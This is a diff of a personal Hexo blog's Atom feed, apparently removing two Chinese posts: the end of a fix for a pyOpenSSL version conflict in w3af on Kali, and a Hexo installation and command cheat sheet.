_lib.SSL_ST_OK&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;解决方法2：&lt;/strong&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;卸载w3af要求的pyOpenSSL版本&lt;/p&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ pip uninstall pyOpenSSL&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;安装最新版pyOpenSSL&lt;/p&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ pip install pyOpenSSL&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;编辑w3af安装目录中的/w3af/core/controllers/dependency_check/requirements.py文件，将要求的pyOpenSSl版本号改为你安装的最新版，即修改下面这一行代码&lt;/p&gt;
-&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;PIPDependency(&lt;span class=&quot;string&quot;&gt;&#39;OpenSSL&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;pyOpenSSL&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Version of pyOpenSSL you are using&#39;&lt;/span&gt;)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-    
-    </summary>
-    
-      <category term="Bug" scheme="https://howiezhao.github.io/categories/Bug/"/>
-    
-    
-      <category term="Kali" scheme="https://howiezhao.github.io/tags/Kali/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hexo初体验</title>
-    <link href="https://howiezhao.github.io/2017/06/20/hexo-experience/"/>
-    <id>https://howiezhao.github.io/2017/06/20/hexo-experience/</id>
-    <published>2017-06-20T09:38:54.318Z</published>
-    <updated>2018-04-26T09:25:47.630Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装Hexo前，需要安装<a href="https://nodejs.org/en/download/" target="_blank" rel="external">Node.js</a>和<a href="https://git-scm.com/downloads" target="_blank" rel="external">Git</a>，安装Node.js的同时，npm(Node Package Manager)也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ node -v</div></pre></td></tr></table></figure></p>
-<p>来测试Node.js是否成功安装，输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm -v</div></pre></td></tr></table></figure></p>
-<p>来测试npm是否成功安装。</p>
-<p>npm成功安装后，可使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g hexo-cli</div></pre></td></tr></table></figure></p>
-<p>来快速安装Hexo</p>
-<p>参数-g表示全局安装，npm的包安装分为本地安装（local）和全局安装（global）两种，区别在于：</p>
-<p><strong>本地安装</strong></p>
-<ul>
-<li>将安装包放在 ./node_modules 下（运行npm时所在的目录）</li>
-<li>可以通过 require() 来引入本地安装的包</li>
-</ul>
-<p><strong>全局安装</strong></p>
-<ul>
-<li>将安装包放在 /usr/local下</li>
-<li>可以直接在命令行里使用</li>
-</ul>
-<a id="more"></a>
-<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="新建一个网站"><a href="#新建一个网站" class="headerlink" title="新建一个网站"></a>新建一个网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo init [folder]</div></pre></td></tr></table></figure>
-<p>如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站。</p>
-<h3 id="新建一篇文章"><a href="#新建一篇文章" class="headerlink" title="新建一篇文章"></a>新建一篇文章</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo n [layout] &lt;title&gt;</div></pre></td></tr></table></figure>
-<p>如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p>
-<h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo g</div></pre></td></tr></table></figure>
-<h3 id="启动服务预览"><a href="#启动服务预览" class="headerlink" title="启动服务预览"></a>启动服务预览</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo s</div></pre></td></tr></table></figure>
-<h3 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo d</div></pre></td></tr></table></figure>
-<h3 id="清除缓存文件-db-json-和已生成的静态文件-public-。"><a href="#清除缓存文件-db-json-和已生成的静态文件-public-。" class="headerlink" title="清除缓存文件(db.json)和已生成的静态文件(public)。"></a>清除缓存文件(db.json)和已生成的静态文件(public)。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo clean</div></pre></td></tr></table></figure>
-<p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;安装Hexo前，需要安装&lt;a href=&quot;https://nodejs.org/en/download/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Node.js&lt;/a&gt;和&lt;a href=&quot;https://git-scm.com/downloads&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Git&lt;/a&gt;，安装Node.js的同时，npm(Node Package Manager)也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ node -v&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;来测试Node.js是否成功安装，输入&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ npm -v&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;来测试npm是否成功安装。&lt;/p&gt;
-&lt;p&gt;npm成功安装后，可使用&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ npm install -g hexo-cli&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;来快速安装Hexo&lt;/p&gt;
-&lt;p&gt;参数-g表示全局安装，npm的包安装分为本地安装（local）和全局安装（global）两种，区别在于：&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;本地安装&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;将安装包放在 ./node_modules 下（运行npm时所在的目录）&lt;/li&gt;
-&lt;li&gt;可以通过 require() 来引入本地安装的包&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;全局安装&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;将安装包放在 /usr/local下&lt;/li&gt;
-&lt;li&gt;可以直接在命令行里使用&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
-    
-    
-      <category term="Hexo" scheme="https://howiezhao.github.io/tags/Hexo/"/>
+      <category term="密码学" scheme="https://howiezhao.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
     
   </entry>
   
